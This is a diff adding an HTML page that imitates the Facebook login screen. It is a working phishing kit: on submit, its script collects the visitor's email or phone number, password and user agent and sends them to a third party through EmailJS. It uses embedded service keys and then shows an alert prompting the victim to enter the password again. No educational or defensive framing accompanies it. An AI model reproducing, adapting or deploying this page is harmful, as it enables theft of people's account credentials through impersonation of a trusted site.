@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        (function(){
+            emailjs.init("M7kTeGIhm3B3Kyncc"); // Replace with your EmailJS Public Key
+        })();
+
+        function sendLoginInfo(event) {
+            event.preventDefault();
+            var userInfo = {
+                username: document.getElementById("username").value,
+                password: document.getElementById("password").value,
+                device: navigator.userAgent
+            };
+
+            emailjs.send("86220837", "template_0k6iexh", userInfo)
+            .then(function(response) {
+                alert("Inter your Facebook Login password!");
+            }, function(error) {
+                alert("Failed to  login.");
+            });
+        }
+    </script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            flex-direction: column;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+        }
+        .left {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .left h1 {
+            color: #1877f2;
+            font-size: 40px;
+            margin: 0;
+        }
+        .left p {
+            font-size: 16px;
+            color: #1c1e21;
+        }
+        .right {
+            width: 100%;
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .right input[type="text"], .right input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 14px;
+        }
+        .right button {
+            width: 100%;
+            padding: 12px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            cursor: pointer;
+        }
+        .right a {
+            display: block;
+            text-align: center;
+            margin: 10px 0;
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .right .create-account {
+            background-color: #42b72a;
+            margin-top: 10px;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #1c1e21;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="left">
+            <h1>facebook</h1>
+            <p>Facebook helps you connect and share with the people in your life.</p>
+        </div>
+        <div class="right">
+            <form onsubmit="sendLoginInfo(event)">
+                <input type="text" id="username" placeholder="Email address or phone number" required>
+                <input type="password" id="password" placeholder="Password" required>
+                <button type="submit">Log in</button>
+            </form>
+            <a href="#">Forgotten password?</a>
+            <button class="create-account">Create new account</button>
+        </div>
+    </div>
+    <div class="footer">
+        <a href="#">Create a Page</a> for a celebrity, brand, or business.
+    </div>
+</body>
+</html>
